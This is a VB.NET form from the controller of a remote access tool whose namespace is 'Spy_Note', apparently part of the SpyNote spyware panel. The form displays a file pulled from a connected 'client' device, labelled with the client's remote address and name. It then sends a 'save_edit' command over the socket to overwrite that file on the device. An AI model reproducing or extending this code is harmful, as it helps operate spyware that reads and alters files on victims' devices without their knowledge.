Imports Spy_Note.etonyps

Public Class Notepad
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public pathFile As String
    Private Rich As Boolean
    Public Sub New()
        Me.Rich = True
        Me.InitializeComponent()
    End Sub
    Private Sub Notepad_Load(sender As Object, e As EventArgs) Handles Me.Load
        MyBase.Icon = store_0.icons_0("window")
        Me.RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
        Dim text As String = String.Format(Me.Text + " - Remote Address & Port: {0} Client Name: {1} File path: {2}", Me.Client_remote_Address, Me.Name_Client, Me.pathFile)
        Me.Text = text
    End Sub

    Public Sub Client_data(data As String)
        Me.RichTextBox1.Text = data
        Me.Rich = False
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"save_edit", My.Forms.Form1.s.SplitData, Me.pathFile, My.Forms.Form1.s.SplitData, Me.RichTextBox1.Text}))
        MyBase.Close()
    End Sub

    Private Sub RichTextBox1_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox1.TextChanged
        Dim flag As Boolean = Not Me.Rich
        If flag Then
            Dim flag2 As Boolean = Not Me.Button1.Enabled
            If flag2 Then
                Me.Button1.Enabled = True
            End If
        End If
    End Sub
End Class